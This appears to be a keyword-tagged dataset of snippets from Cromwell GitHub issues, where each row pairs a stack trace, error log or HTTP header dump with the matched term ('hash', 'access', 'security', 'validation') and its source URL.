Security,"1: on google, generating a psURL and calling HEAD on it (which you can also do with a GET and only as for the 1st byte). HTTP/2 200 ; x-guploader-uploadid: AEnB2Uo10d8ECr7tR5601R8roi8MIXlzvg1rjyMui9wavFC7KO2Pv2QBk94Qv22mgAz5Ih0nnayc2kXj5XBFgRUqkNTJNtAo7Q; expires: Fri, 29 Jun 2018 15:56:42 GMT; date: Fri, 29 Jun 2018 15:56:42 GMT; cache-control: private, max-age=0; last-modified: Fri, 29 Jun 2018 15:53:49 GMT; etag: ""09f7e02f1290be211da707a266f153b3""; x-goog-generation: 1530287629024005; x-goog-metageneration: 1; x-goog-stored-content-encoding: identity; x-goog-stored-content-length: 6; content-type: text/plain; content-language: en; x-goog-hash: crc32c=sMnOMw==; x-goog-hash: md5=CffgLxKQviEdpweiZvFTsw==; x-goog-storage-class: STANDARD; accept-ranges: bytes; content-length: 6; server: UploadServer; alt-svc: quic="":443""; ma=2592000; v=""43,42,41,39,35""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401397990:649,hash,hash,649,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401397990,2,['hash'],['hash']
Security,1; mkfifo: cannot create fifo '/err.1': Permission denied; ; 04:26:11; /bin/bash: line 15: /out.1: No such file or directory; ; 04:26:11; /bin/bash: line 16: /err.1: No such file or directory; ; 04:26:11; /bin/bash: line 22: /out.1: Permission denied; ; 04:26:11; /bin/bash: line 23: /cromwell_root/bbmap-rc.txt.tmp: Permission denied; ; 04:26:11; mkdir: cannot create directory '/cromwell_root/glob-2e18d4d3f934d19c17412db2b66b70fa': Permission denied; ; 04:26:11; /bin/bash: line 38: /cromwell_root/glob-2e18d4d3f934d19c17412db2b66b70fa/cromwell_glob_control_file: No such file or directory; ; 04:26:11; ln: failed to access '/cromwell_root/*R?.fq.gz': No such file or directory; ; 04:26:11; /bin/bash: line 44: /cromwell_root/glob-2e18d4d3f934d19c17412db2b66b70fa.list: Permission denied; ; 04:26:11; ls: cannot access '/cromwell_root/glob-2e18d4d3f934d19c17412db2b66b70fa': No such file or directory; ; 04:26:11; mkdir: cannot create directory '/cromwell_root/glob-560912e697c3494360223c7ca65aa3e8': Permission denied; ; 04:26:11; /bin/bash: line 52: /cromwell_root/glob-560912e697c3494360223c7ca65aa3e8/cromwell_glob_control_file: No such file or directory; ; 04:26:11; ln: failed to access '/cromwell_root/*.qcstats': No such file or directory; ; 04:26:11; /bin/bash: line 58: /cromwell_root/glob-560912e697c3494360223c7ca65aa3e8.list: Permission denied; ; 04:26:11; ls: cannot access '/cromwell_root/glob-560912e697c3494360223c7ca65aa3e8': No such file or directory; ; 04:26:11; mkdir: cannot create directory '/cromwell_root/glob-b34dfc006a981a93d6da067cf50036fe': Permission denied; ; 04:26:11; /bin/bash: line 66: /cromwell_root/glob-b34dfc006a981a93d6da067cf50036fe/cromwell_glob_control_file: No such file or directory; ; 04:26:11; ln: failed to access '/cromwell_root/cwl.output.json': No such file or directory; ; 04:26:11; /bin/bash: line 72: /cromwell_root/glob-b34dfc006a981a93d6da067cf50036fe.list: Permission denied; ; 04:26:11; ls: cannot access '/cromwell_root/,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4542:5380,access,access,5380,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4542,2,['access'],['access']
Security,2); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:200); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; :; Could not localize fastq -> /data/PROJECTS/2019_01_28_scMeth/scripts/Automated_Pipeline/cromwell/example_wdl/cromwell-executions/scMeth/41d3eecf-c5a9-42e4-8a29-8be9c252b7f5/call-trimAdapters/inputs/13016223/fastq:; 	fastq doesn't exist; 	File not found /data/PROJECTS/2019_01_28_scMeth/scripts/Automated_Pipeline/cromwell/example_wdl/cromwell-executions/scMeth/41d3eecf-c5a9-42e4-8a29-8be9c252b7f5/call-trimAdapters/inputs/13016223/fastq -> /data/PROJECTS/2019_01_28_scMeth/scripts/Automated_Pipeline/cromwell/example_wdl/fastq; 	File not found fastq; 	File not found /data/PROJECTS/2019_01_28_scMeth/scripts/Automated_Pipeline/cromwell/example_wdl/fastq; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:574). ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:15083,validat,validation,15083,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,8,"['Validat', 'validat']","['Validation', 'ValidationTry', 'validation']"
Security,2); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.net.SocketTimeoutException: Read timed out; 	at java.net.SocketInputStream.socketRead0(Native Method); 	at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); 	at java.net.SocketInputStream.read(SocketInputStream.java:171); 	at java.net.SocketInputStream.read(SocketInputStream.java:141); 	at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); 	at sun.security.ssl.InputRecord.read(InputRecord.java:503); 	at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); 	at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); 	at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); 	at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); 	at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); 	at java.io.BufferedInputStream.read(BufferedInputStream.java:345); 	at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); 	at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1569); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1474); 	at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(H,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2229:3609,secur,security,3609,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2229,1,['secur'],['security']
Security,"2-15 21:27:55,79] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.categorical_covariates:0:1-20000000027 [9e4f5894main.categorical_covariates:0:1]: Unrecognized runtime attribute keys: dx_t; imeout; [2022-12-15 21:27:55,79] [info] BT-322 9e4f5894:main.categorical_covariates:0:1 cache hit copying success with aggregated hashes: initial = C760DC2B9015D0B787EF7BEE7D21AA58, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.categorical_covariates:0:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:55,79] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.pcs:-1:1-20000000010 [9e4f5894main.pcs:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:27:55,79] [info] BT-322 9e4f5894:main.pcs:-1:1 cache hit copying success with aggregated hashes: initial = 58D108557F21E539CF9BE064A9528392, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.pcs:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:56,12] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.ethnicity_self_report:-1:1-20000000008 [9e4f5894main.ethnicity_self_report:NA:1]: Unrecognized runtime attribute keys: dx_t; imeout; [2022-12-15 21:27:56,12] [info] BT-322 9e4f5894:main.ethnicity_self_report:-1:1 cache hit copying success with aggregated hashes: initial = A32F403CF4C1AEE5AC6D327D9290D15E, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:56,12] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.ethnicity_self_report:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:56,51] [info] WorkflowExecutionAc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:31154,hash,hashes,31154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"2-8618f1082470/call-ubam2bam/from_ubam.to_bam_workflow/4306b863-7708-4627-babd-47017753d512/call-MakeAnalysisReadyBam/processing.MakeAnalysisReadyBam/ac5adb53-d888-4b9f-b062-48504e1a4853/call-SortAndFixSampleBam/XXXXXX-001.aligned.duplicate_marked.sorted.bam --useOriginalQualities -O XXXXXX-001.recal_data.csv -knownSites /cromwell_root/required-files/references/broadBundle/dbsnp_138.b37.vcf -knownSites /cromwell_root/required-files/references/broadBundle/Mills_and_1000G_gold_standard.indels.b37.vcf -knownSites /cromwell_root/required-files/references/broadBundle/1000G_phase1.indels.b37.vcf -L 10:1+; Picked up _JAVA_OPTIONS: -Djava.io.tmpdir=/cromwell_root/tmp.bdd4ff39; [Global flags]. (...EXECUTION LOGS...). 16:35:03.610 INFO ProgressMeter - 10:135446829 2.3 3269161 1437710.1; 16:35:03.614 INFO ProgressMeter - Traversal complete. Processed 3269161 total reads in 2.3 minutes.; 16:35:03.819 INFO BaseRecalibrator - Calculating quantized quality scores...; 16:35:03.882 INFO BaseRecalibrator - Writing recalibration report...; 16:35:04.992 INFO BaseRecalibrator - ...done!; 16:35:04.996 INFO BaseRecalibrator - Shutting down engine; [October 31, 2018 4:35:05 PM UTC] org.broadinstitute.hellbender.tools.walkers.bqsr.BaseRecalibrator done. Elapsed time: 2.34 minutes.; Runtime.totalMemory()=4054515712; Tool returned:; 3269161; Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]...; ServiceException: 401 Requester pays bucket access requires authentication. ; Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]...; ServiceException: 401 Requester pays bucket access requires authentication. ; Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]...; ServiceException: 401 Requester pays bucket access requires authentication.; ```. The only thing that is not default in bucket is that we have set lifecycle option to delete objects after 5 days. Our workflow takes ~6 hours to end so it should not be a problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435884126:2325,access,access,2325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435884126,6,"['access', 'authenticat']","['access', 'authentication']"
Security,200 files scattered 200x fails to call cache due to GCS hash timeout,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4873:56,hash,hash,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4873,1,['hash'],['hash']
Security,"2016-06-02 00:18:27,540 cromwell-system-akka.actor.default-dispatcher-341 INFO - WorkflowActor [UUID(fa18fa5f)]: persisting status of RotateGVCFIndex to Running.; 2016-06-01T20:19:00.527-0400: 104257.028: [GC (Allocation Failure) [PSYoungGen: 1821155K->270322K(1864192K)] 4006446K->2894561K(7456768K), 0.1718483 secs] [Times: user=1.22 sys=0.01, real=0.17 secs] ; 2016-06-02 00:19:39,491 ForkJoinPool-3-worker-7 ERROR - Exception not convertible into handled response; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method) ~[na:1.8.0_72]; at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) ~[na:1.8.0_72]; at java.net.SocketInputStream.read(SocketInputStream.java:170) ~[na:1.8.0_72]; at java.net.SocketInputStream.read(SocketInputStream.java:141) ~[na:1.8.0_72]; at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) ~[na:1.8.0_72]; at sun.security.ssl.InputRecord.read(InputRecord.java:503) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930) ~[na:1.8.0_72]; at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) ~[na:1.8.0_72]; at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) ~[na:1.8.0_72]; at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) ~[na:1.8.0_72]; at java.io.BufferedInputStream.read(BufferedInputStream.java:345) ~[na:1.8.0_72]; at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704) ~[na:1.8.0_72]; at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647) ~[na:1.8.0_72]; at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536) ~[na:1.8.0_72]; at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441) ~[na:1.8.0_72]; at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConne",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/932:2443,secur,security,2443,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/932,1,['secur'],['security']
Security,"2019-04-18 17:19:17,92] [info] Running with database db.url = jdbc:hsqldb:mem:58f8cd7c-3e36-430d-b36a-1620b0333e3e;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:18,65] [info] Slf4jLogger started; [2019-04-18 17:19:18,79] [info] Pre Processing Workflow...; [2019-04-18 17:19:19,12] [info] Pre-Processing file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl; WARNING: Illegal reflective access by org.python.core.PySystemState (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/real",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:1955,access,access,1955,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"2020-08-24 15:28:47,48] [error] 'nioPath' not implemented for SraPath; java.lang.UnsupportedOperationException: 'nioPath' not implemented for SraPath; 	at cromwell.filesystems.sra.SraPath.nioPath(SraPathBuilder.scala:31); 	at cromwell.core.path.Path.nioPathPrivate(PathBuilder.scala:113); 	at cromwell.core.path.Path.nioPathPrivate$(PathBuilder.scala:113); 	at cromwell.filesystems.sra.SraPath.nioPathPrivate(SraPathBuilder.scala:26); 	at cromwell.core.path.PathObjectMethods.hashCode(PathObjectMethods.scala:18); 	at cromwell.core.path.PathObjectMethods.hashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1102,hash,hashCode,1102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['hash'],['hashCode']
Security,"20:19:00.527-0400: 104257.028: [GC (Allocation Failure) [PSYoungGen: 1821155K->270322K(1864192K)] 4006446K->2894561K(7456768K), 0.1718483 secs] [Times: user=1.22 sys=0.01, real=0.17 secs] ; 2016-06-02 00:19:39,491 ForkJoinPool-3-worker-7 ERROR - Exception not convertible into handled response; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method) ~[na:1.8.0_72]; at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) ~[na:1.8.0_72]; at java.net.SocketInputStream.read(SocketInputStream.java:170) ~[na:1.8.0_72]; at java.net.SocketInputStream.read(SocketInputStream.java:141) ~[na:1.8.0_72]; at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) ~[na:1.8.0_72]; at sun.security.ssl.InputRecord.read(InputRecord.java:503) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930) ~[na:1.8.0_72]; at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) ~[na:1.8.0_72]; at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) ~[na:1.8.0_72]; at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) ~[na:1.8.0_72]; at java.io.BufferedInputStream.read(BufferedInputStream.java:345) ~[na:1.8.0_72]; at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704) ~[na:1.8.0_72]; at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647) ~[na:1.8.0_72]; at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536) ~[na:1.8.0_72]; at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441) ~[na:1.8.0_72]; at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37) ~[cromwell.ja",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/932:2617,secur,security,2617,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/932,1,['secur'],['security']
Security,234); 	at scala.collection.immutable.List.map(List.scala:285); 	at wdl4s.WdlNamespace$.apply(WdlNamespace.scala:207); 	at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$load(WdlNamespace.scala:177); 	at wdl4s.WdlNamespace$.loadUsingSource(WdlNamespace.scala:173); 	at wdl4s.WdlNamespaceWithWorkflow$.load(WdlNamespace.scala:542); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:363); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:356); 	at lenthall.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:17); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespaceWithImports(MaterializeWorkflowDescriptorActor.scala:356); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespace(MaterializeWorkflowDescriptorActor.scala:372); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:172); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3.applyOrElse(MaterializeWorkflowDescriptorActor.scala:132); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3.applyOrElse(MaterializeWorkflowDescriptorActor.scala:130); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at akka.actor.FSM$class.processEvent(FSM.scala:663); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.akka$actor$LoggingFSM$$super$processEvent(MaterializeWorkflowDescriptorActor.scala:117); 	at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.processEvent(Materializ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1958:2496,validat,validateNamespace,2496,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1958,1,['validat'],['validateNamespace']
Security,"255) NULL, DEPLOYMENT_ID VARCHAR(10) NULL); 2019-01-31 18:29:35,271 INFO - SELECT COUNT(*) FROM cromwell.DATABASECHANGELOG; 2019-01-31 18:29:35,279 INFO - Reading from cromwell.DATABASECHANGELOG; 2019-01-31 18:29:35,280 INFO - SELECT * FROM cromwell.DATABASECHANGELOG ORDER BY DATEEXECUTED ASC, ORDEREXECUTED ASC; 2019-01-31 18:29:35,282 INFO - SELECT COUNT(*) FROM cromwell.DATABASECHANGELOGLOCK; 2019-01-31 18:29:35,461 INFO - Successfully released change log lock; 2019-01-31 18:29:35,469 ERROR - Failed to instantiate Cromwell System. Shutting down Cromwell.; java.lang.ArrayIndexOutOfBoundsException: 1; 	at liquibase.datatype.DataTypeFactory.fromDescription(DataTypeFactory.java:251); 	at liquibase.change.core.CreateTableChange.generateStatements(CreateTableChange.java:70); 	at liquibase.change.AbstractChange.generateStatementsVolatile(AbstractChange.java:287); 	at liquibase.change.AbstractChange.warn(AbstractChange.java:358); 	at liquibase.changelog.visitor.ValidatingVisitor.visit(ValidatingVisitor.java:109); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:83); 	at liquibase.changelog.DatabaseChangeLog.validate(DatabaseChangeLog.java:269); 	at liquibase.Liquibase.update(Liquibase.java:198); 	at liquibase.Liquibase.update(Liquibase.java:179); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBacke",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4605:2712,Validat,ValidatingVisitor,2712,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4605,1,['Validat'],['ValidatingVisitor']
Security,"268581 container_name/cromwellazure_cromwell_1[2296]: #011at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:54); Sep 1 16:44:47 vmce33268581 container_name/cromwellazure_cromwell_1[2296]: #011at akka.actor.ActorCell.receiveMessage(ActorCell.scala:614); Sep 1 16:44:47 vmce33268581 container_name/cromwellazure_cromwell_1[2296]: #011at akka.actor.ActorCell.invoke(ActorCell.scala:583); Sep 1 16:44:47 vmce33268581 container_name/cromwellazure_cromwell_1[2296]: #011at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); Sep 1 16:44:47 vmce33268581 container_name/cromwellazure_cromwell_1[2296]: #011at akka.dispatch.Mailbox.run(Mailbox.scala:229); Sep 1 16:44:47 vmce33268581 container_name/cromwellazure_cromwell_1[2296]: #011at akka.dispatch.Mailbox.exec(Mailbox.scala:241); Sep 1 16:44:47 vmce33268581 container_name/cromwellazure_cromwell_1[2296]: #011at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); Sep 1 16:44:47 vmce33268581 container_name/cromwellazure_cromwell_1[2296]: #011at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); Sep 1 16:44:47 vmce33268581 container_name/cromwellazure_cromwell_1[2296]: #011at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); Sep 1 16:44:47 vmce33268581 container_name/cromwellazure_cromwell_1[2296]: #011at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Sep 1 16:44:51 vmce33268581 container_name/cromwellazure_cromwell_1[2296]: 2022-09-01 16:44:51,173 cromwell-system-akka.dispatchers.engine-dispatcher-29033 INFO - WorkflowManagerActor: Workflow actor for 2cd0993c-94df-4663-923d-48bbce3feead completed with status 'Failed'. The workflow will be removed from the workflow store. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6904:6349,PASSWORD,PASSWORDS,6349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6904,1,['PASSWORD'],['PASSWORDS']
